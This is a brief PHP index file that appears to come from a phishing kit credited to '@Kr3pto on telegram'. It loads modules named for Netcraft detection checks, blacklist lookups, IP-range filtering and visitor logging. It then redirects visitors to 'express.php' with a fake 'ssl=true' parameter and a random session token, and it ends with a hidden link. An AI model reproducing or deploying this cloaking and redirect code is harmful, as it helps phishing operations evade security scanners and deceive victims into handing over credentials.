<?php
//@Kr3pto on telegram
require "config.php";
require "assets/includes/functions.php";
require "assets/includes/visitor_log.php";
require "assets/includes/netcraft_check.php";
require "assets/includes/blacklist_lookup.php";
require "assets/includes/ip_range_check.php";
header("location:express.php?ssl=true&session=" . generateRandomString(130));
?>
<a rel="nofollow" style="display:none;" href="monika/">Meow</a>